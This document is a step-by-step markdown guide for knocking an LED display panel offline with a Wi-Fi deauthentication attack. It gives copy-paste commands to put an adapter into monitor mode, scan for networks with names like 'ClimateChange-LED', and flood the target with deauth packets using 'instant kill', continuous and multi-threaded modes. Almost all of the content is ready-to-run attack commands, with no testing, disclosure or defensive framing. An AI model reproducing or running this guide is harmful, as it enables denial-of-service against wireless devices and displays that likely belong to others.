# 🚀 Simple Step-by-Step Guide - From Start to Finish

## Complete Guide to Take Down Your LED Panel

---

## 📋 STEP 1: Setup (One Time Only)

### Open Terminal in Kali Linux

```bash
# Navigate to the script directory
cd LED_PANEL

# Make scripts executable
chmod +x *.py *.sh

# Run setup (if needed)
sudo ./setup_kali.sh
```

**That's it! Setup is done.**

---

## 📋 STEP 2: Plug In Your WiFi Adapter

1. Plug your **LEO X SYS WiFi adapter** into USB port
2. Wait a few seconds for it to be detected
3. Verify it's connected:

```bash
lsusb | grep -i wifi
```

You should see your adapter listed.

---

## 📋 STEP 3: Find Your WiFi Interface

```bash
iwconfig
```

**Look for your adapter** - it will be something like:
- `wlan0`
- `wlan1`
- `wlan2`

**Remember this name!** (We'll use `wlan0` in examples, replace with yours)

---

## 📋 STEP 4: Enable Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode (replace wlan0 with your interface)
sudo airmon-ng start wlan0
```

**Output will show:**
```
Found X processes that could cause trouble...
Interface wlan0mon is up
```

**Note the new interface name!** It's usually `wlan0mon` (your interface + "mon")

---

## 📋 STEP 5: Find Your LED Panel

```bash
# Scan for networks (replace wlan0mon with your monitor interface)
sudo python3 find_led_panel.py wlan0mon 30
```

**Wait 30 seconds** while it scans...

**Look for:**
- Networks with "LED", "Panel", "Display", "Climate", "Change" in the name
- Strong signal strength
- Networks that appear when your LED panel is on

**COPY THE BSSID (MAC ADDRESS)** - It looks like: `AA:BB:CC:DD:EE:FF`

**Example output:**
```
[+] Found: ClimateChange-LED - AA:BB:CC:DD:EE:FF
```

---

## 📋 STEP 6: Attack the LED Panel

### Option A: INSTANT KILL (Recommended - Fastest!)

```bash
sudo python3 power_deauth.py -i wlan0mon -t AA:BB:CC:DD:EE:FF --instant
```

**Replace:**
- `wlan0mon` with your monitor interface
- `AA:BB:CC:DD:EE:FF` with the BSSID you copied

**This sends 12,000+ packets immediately - Panel goes down INSTANTLY!**

---

### Option B: Continuous POWER Attack

```bash
sudo python3 power_deauth.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
```

**This keeps attacking continuously - Panel stays down as long as script runs**

**Press `Ctrl+C` to stop**

---

### Option C: Regular Attack (If POWER doesn't work)

```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
```

---

## 📋 STEP 7: Verify It's Working

**Watch your LED panel** - it should:
- Stop displaying immediately
- WiFi network should disappear from scans
- Panel should be "down"

---

## 📋 STEP 8: Stop the Attack

**Press `Ctrl+C`** in the terminal

---

## 📋 STEP 9: Cleanup (When Done)

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart network manager
sudo systemctl restart NetworkManager
```

---

## 🎯 COMPLETE EXAMPLE (Copy-Paste Ready)

```bash
# STEP 1: Setup (one time)
cd LED_PANEL
chmod +x *.py *.sh

# STEP 2: Find interface
iwconfig
# Note: wlan0 (example)

# STEP 3: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Note: wlan0mon created

# STEP 4: Find LED panel
sudo python3 find_led_panel.py wlan0mon 30
# Note: BSSID = AA:BB:CC:DD:EE:FF (example)

# STEP 5: INSTANT KILL attack
sudo python3 power_deauth.py -i wlan0mon -t AA:BB:CC:DD:EE:FF --instant

# STEP 6: Stop (Ctrl+C when done)

# STEP 7: Cleanup
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## ⚠️ TROUBLESHOOTING

### Problem: "Interface not found"
```bash
# Check interfaces again
iwconfig
# Try different interface name (wlan1, wlan2, etc.)
```

### Problem: "Permission denied"
```bash
# Always use sudo!
sudo python3 power_deauth.py -i wlan0mon -t <BSSID> --instant
```

### Problem: "No networks found"
```bash
# Check monitor mode
iwconfig | grep Mode
# Should show: Mode:Monitor

# Scan longer
sudo python3 find_led_panel.py wlan0mon 60
```

### Problem: Panel still not going down
```bash
# 1. Get closer to the LED panel
# 2. Use EXTREME mode:
sudo python3 power_deauth.py -i wlan0mon -t <BSSID> --threads 10

# 3. Set correct channel (if known):
sudo iwconfig wlan0mon channel 6
sudo python3 power_deauth.py -i wlan0mon -t <BSSID> --instant
```

---

## 📝 QUICK REFERENCE

| Step | Command |
|------|---------|
| **Find Interface** | `iwconfig` |
| **Enable Monitor** | `sudo airmon-ng start wlan0` |
| **Scan Networks** | `sudo python3 find_led_panel.py wlan0mon 30` |
| **INSTANT KILL** | `sudo python3 power_deauth.py -i wlan0mon -t <BSSID> --instant` |
| **POWER Attack** | `sudo python3 power_deauth.py -i wlan0mon -t <BSSID>` |
| **Stop Attack** | `Ctrl+C` |
| **Cleanup** | `sudo airmon-ng stop wlan0mon` |

---

## 🎯 WHAT TO REPLACE

In all commands, replace:

1. **`wlan0`** → Your actual WiFi interface name
2. **`wlan0mon`** → Your monitor interface name (usually interface + "mon")
3. **`AA:BB:CC:DD:EE:FF`** → Your LED panel's BSSID (MAC address)

---

## ✅ CHECKLIST

Before attacking, make sure:

- [ ] WiFi adapter is plugged in
- [ ] Interface name is known (`iwconfig`)
- [ ] Monitor mode is enabled (`airmon-ng start`)
- [ ] LED panel BSSID is known (`find_led_panel.py`)
- [ ] Running commands with `sudo`
- [ ] Using correct interface name in commands

---

## 🚀 READY TO GO?

**Just follow these 5 commands:**

```bash
# 1. Enable monitor
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# 2. Find panel (wait 30 seconds)
sudo python3 find_led_panel.py wlan0mon 30

# 3. INSTANT KILL (replace BSSID)
sudo python3 power_deauth.py -i wlan0mon -t <BSSID> --instant

# 4. Done! Panel is down!
```

**That's it! Simple and effective!** 🔥

---

## 📚 Need More Help?

- **Detailed Guide**: See `POWER_ATTACK_GUIDE.md`
- **Quick Reference**: See `QUICK_POWER_REFERENCE.md`
- **Full Documentation**: See `README.md`

---

**Good luck taking down that LED panel!** 💪

